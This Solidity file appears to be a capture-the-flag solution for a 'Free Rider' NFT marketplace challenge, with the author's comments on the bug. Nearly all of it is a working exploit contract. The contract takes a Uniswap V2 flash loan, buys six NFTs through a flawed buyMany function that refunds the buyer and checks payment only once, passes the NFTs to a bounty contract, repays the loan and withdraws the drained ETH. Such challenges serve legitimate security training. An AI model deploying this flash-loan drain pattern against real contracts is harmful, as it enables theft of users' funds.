// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


import "../../UniswapV2Core/interfaces/IUniswapV2Pair.sol";
import "../../OZ/token/ERC721/IERC721Receiver.sol";
import "./Level10-Contracts.sol";

/**
So, it appears that, at the very least, I'll need to take a flash loan from my
uniswap deployment. Need to look into how that works.

Then, with my extra Eth, I need to perform a buy. I'm suspicious of the 
'pay the seller' line in the NFT marketplace contract. It looks like it doesn't
actually take my money, but rather a balance already in the contract (90ETH).
It's also suspicious that (from a meta-analysis perspective) that 6 * 15 happens
to be 90...0

Since I won't be spending any of the flashloaned ETH (I just need it to pass
a check) it shouldn't be hard to pay it back

 */

interface IWETH {
    function deposit() external payable;
    function transfer(address to, uint value) external returns (bool);
    function withdraw(uint) external;
    function balanceOf(address) external returns (uint256);
}

contract MarketPlaceExploit is IERC721Receiver {

    IUniswapV2Pair pair = IUniswapV2Pair(0x413BC17Ef2256f42bEFC75fBCc8f881aa33844De);
    IWETH weth = IWETH(0xA72d94a231e175e5CCcCDb9131456209e85fEd57);
    FreeRiderNFTMarketplace marketplace;
    address buyer;
    address owner;
    address dvnft;
    bytes junk = "44444444";
    bytes4 constant selector = bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"));

    constructor(address _dvnft, address _marketplace, address _buyer) payable {
        owner = msg.sender;
        dvnft = _dvnft;
        marketplace = FreeRiderNFTMarketplace(payable(_marketplace));
        buyer = _buyer;
    }

    receive() external payable {}
 
    function takeFlashLoan(uint256 amountWeAreBorrowing) public returns(uint256) {
        // Add 1 gwei to the fee as margin, the below math doesn't seem to consistently give an answer the K product will accept.
        uint256 fee = ((amountWeAreBorrowing * 10 ** 3) / 997) - amountWeAreBorrowing + 100000000;
        require(address(this).balance >= fee, "Not enough ETH for fee");
        weth.deposit{value: fee}();
        pair.swap(0, amountWeAreBorrowing, address(this), junk);
        return fee;
    }
    
    // Token that comes back is WETH. First, let's just send the WETH back.
    function uniswapV2Call(address, uint, uint amount1, bytes calldata ) external {
        // implicitly includes the fee I deposited + the amount of WETH I just flashloaned.
        uint256 totalWETH = weth.balanceOf(address(this)); 
        weth.withdraw(amount1); // get our ETH out of the WETH contract. WETH still holds the fee amount.
        uint256[] memory tokenIds = new uint256[](6);
        for (uint8 i = 0; i < 6; i++) {tokenIds[i] = i;}
        marketplace.buyMany{value: amount1}(tokenIds);
        weth.deposit{value: amount1}(); // put our ETH borrowed back to get WETH
        weth.transfer(address(pair), totalWETH); // Send borrow plus fee back to uniswap
    }

    function onERC721Received(address, address, uint256, bytes memory) external pure override returns (bytes4) {
        return selector;
        }

    // Iterate through the token list, sending each in turn. On 6th, the buyer contract will remit ETH.
    function sendNFTsToBuyer() external {
        for (uint8 tokenId = 0; tokenId < 6; tokenId++) {
        (bool success, bytes memory _msg) = dvnft.call(abi.encodeWithSignature("transferFrom(address,address,uint256)", address(this), buyer, tokenId));
        require(success, string(_msg));
        }
    }

    function balance() public view returns(uint256) {
        return address(this).balance;
    }

    function withdraw() public {
        (bool success, bytes memory _msg) = owner.call{value: balance()}("");
        require(success, string(_msg));
    }
}

/**
So, final word on this was that I was definitely right to be suspicious of the 
payment line. However, I failed to grasp the nuance until much later. The real
issue is that the contract attempts to call the owner of the NFT in order to 
pay them, but it just transferred the NFT to me...so the owner comes back as
me, not the original seller. So I essentially get a refund. I end up draining
the contract mostly of Eth, as it has to draw from its own reserves because of 
the loop only taking Ether payment once.
 */
